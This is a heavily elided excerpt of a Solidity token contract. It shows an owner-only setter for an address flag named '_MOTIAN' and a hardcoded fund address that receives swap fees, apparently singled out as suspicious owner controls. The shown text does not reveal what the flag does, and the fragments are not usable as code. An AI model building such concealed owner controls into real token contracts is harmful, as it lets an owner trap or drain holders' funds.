...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _MOTIAN;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x137A2DEf0A72a1B303e36C6aFde49E520f61B7d4;
    ...
    function setMOTIAN(address addr, bool enable) external onlyOwner {
        _MOTIAN[addr] = enable;
    }
...
contract oo is AbsToken {
    constructor() AbsToken(
        ...
        address(0x137A2DEf0A72a1B303e36C6aFde49E520f61B7d4),
